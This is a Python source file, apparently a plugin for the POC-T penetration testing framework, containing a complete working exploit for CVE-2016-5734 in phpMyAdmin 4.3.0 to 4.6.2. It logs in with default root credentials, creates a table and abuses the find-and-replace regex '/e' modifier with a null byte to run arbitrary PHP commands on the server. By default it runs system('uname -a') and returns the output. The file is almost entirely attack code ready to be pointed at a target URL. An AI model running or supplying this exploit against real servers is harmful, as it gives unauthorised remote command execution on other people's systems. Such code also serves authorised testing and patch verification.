#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me


"""
PhpMyAdmin authorized user RCE exploit (CVE-2016-5734)

Require:
 PhpMyAdmin  4.3.0 - 4.6.2
 PHP         4.3.0 - 5.4.6

Please modify the parameters below before use

"""

import requests

# required
USER = 'root'  # Valid PhpMyAdmin user
PASS = 'root'  # Password for valid PhpMyAdmin user

# option
COMMAND = ''  # PHP command(s) to eval()
DATABASE = ''  # Existing database at a server
TABLE = ''  # Custom table name for exploit


def poc(url):
    url_to_pma = url
    uname = USER
    upass = PASS

    if DATABASE:
        db = DATABASE
    else:
        db = "test"

    custom_table = False
    if TABLE:
        custom_table = True
        table = TABLE
    else:
        table = "prgpwn"

    if COMMAND:
        payload = COMMAND
    else:
        payload = "system('uname -a');"

    s = requests.Session()
    s.verify = False
    sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
    '''.format(table)

    # get_token
    resp = s.post(url_to_pma + "/?lang=en", dict(
        pma_username=uname,
        pma_password=upass
    ))
    if resp.status_code is 200:
        token_place = resp.text.find("token=") + 6
        token = resp.text[token_place:token_place + 32]
    else:
        # print("Cannot get valid authorization token.")
        return False

    if custom_table is False:
        data = {
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
        resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies))
        if resp.status_code == 200:
            if "success" in resp.json():
                if resp.json()["success"] is False:
                    # first = resp.json()["error"][resp.json()["error"].find("<code>") + 6:]
                    # error = first[:first.find("</code>")]
                    # if "already exists" in error:
                    #     # print(error)
                    #     pass
                    # else:
                    #     # print("ERROR: " + error)
                    #     pass
                    return False
    # build exploit
    exploit = {
        "db": db,
        "table": table,
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": payload,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
    }
    resp = s.post(
        url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
    )
    if resp.status_code == 200:
        result = resp.json()["message"][resp.json()["message"].find("</a>") + 8:]
        if len(result):
            return url + "result: " + result
        else:
            return False
